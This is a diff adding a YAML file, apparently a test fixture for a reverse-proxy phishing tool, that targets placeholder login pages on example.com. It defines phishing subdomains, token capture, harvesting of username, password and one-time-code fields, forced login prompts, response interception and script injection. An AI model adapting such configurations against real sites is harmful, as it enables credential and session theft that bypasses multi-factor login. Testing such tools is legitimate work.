@@ -1,0 +1,73 @@
+name: test-full
+author: "@testauthor"
+version: "2"
+
+proxy_hosts:
+  - phish_sub: login
+    orig_sub:  login
+    domain:    example.com
+    is_landing: true
+    is_session: true
+    auto_filter: true
+  - phish_sub: www
+    orig_sub:  www
+    domain:    example.com
+
+sub_filters:
+  - hostname: login.example.com
+    mime_types:
+      - text/html
+    search: "login\\.example\\.com"
+    replace: "{hostname}"
+
+auth_tokens:
+  - domain: ".example.com"
+    keys:
+      - name: session_token
+        required: true
+  - type: body
+    domain: login.example.com
+    keys:
+      - name: access_token
+        search: '"access_token"\s*:\s*"([^"]+)"'
+        required: true
+
+credentials:
+  username:
+    key: "^username$"
+    search: "^(.+)$"
+    type: post
+  password:
+    key: "^password$"
+    search: "^(.+)$"
+    type: post
+  custom:
+    - name: otp
+      key: "^totp$"
+      search: "^(.+)$"
+      type: post
+
+login:
+  domain: login.example.com
+  path:   /login
+
+force_post:
+  - path: "/login"
+    conditions:
+      - key:    "^client_id$"
+        search: "^.+$"
+    params:
+      - key: prompt
+        value: login
+
+intercept:
+  - path:        "/check"
+    body_search:  '"supported":true'
+    status:       200
+    content_type: application/json
+    body:         '{"ok":true}'
+
+js_inject:
+  - trigger_domain: login.example.com
+    trigger_path:   "/done"
+    script:         "console.log('done');"
